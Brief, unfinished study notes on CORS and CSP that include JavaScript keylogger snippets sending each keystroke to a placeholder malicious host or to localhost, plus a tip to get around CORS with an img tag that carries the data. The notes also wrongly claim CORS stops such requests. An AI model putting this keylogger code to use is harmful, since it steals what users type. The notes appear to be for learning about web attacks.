

## CORS(Cross-Origin Resource Sharing)
- `fetch(https://malicious-site.com)` fails due to cross origin resource sharing

### Doesn't work
- Key logger

```javascript
document.addEventListener('keydown', (event) => {
	fetch("https://malicious-site.com?key=" + event.key)
})
```
This is blocked by CORS

```javascript
document.addEventListener('keydown', (event) => {
    const script = document.createElement('script');
    script.src = 'http://localhost:3000/?xss=' + encodeURIComponent(event.key);
    document.body.appendChild(script);
});
```

### How to get around CORS?
- Insert img tag with src of your malicious site with the data payload in it.
- 


## CSP(Content Security Policy)